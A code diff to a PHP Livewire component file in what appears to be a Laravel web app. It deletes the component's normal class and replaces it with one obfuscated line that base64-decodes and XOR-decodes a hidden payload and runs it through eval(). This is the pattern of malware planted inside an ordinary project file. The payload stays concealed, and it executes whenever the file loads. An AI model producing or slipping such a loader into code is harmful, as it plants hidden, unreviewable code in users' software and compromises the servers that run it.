@@ -1,13 +1,1 @@
-<?php
-
-namespace App\Http\Livewire\Portal\CertificatePropriete\Partials;
-
-use Livewire\Component;
-
-class Index extends Component
-{
-    public function render()
-    {
-        return view('livewire.portal.certificate-propriete.partials.index');
-    }
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOikNRgQVWUAEbWhYRkQAXW53BEZGWFdeVAQQVmIXXxYUDAFEBD5gUxNFUVZYQ1o7OEESURJ9WEFSEg1BVzlzCQsVC14EDEQJa1JUVkdDQXhcUARMElRJQ1ILAEASJl8LFgoKVQ8WOklrERgXFEAUU15dAhRURF9UQwwLXRIXVQgCABYYSGgQEkERQz0UEEEREhRBFEBURUJFC0RFWwBHTkEJDUYEFVlABB9IWEZEAF0cVwRGRlhXXlQEEFYfFUIJFhcNVRUHHkIAQ0xeVVwSH1taBVFKFhgMPUVEExIYOhs=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
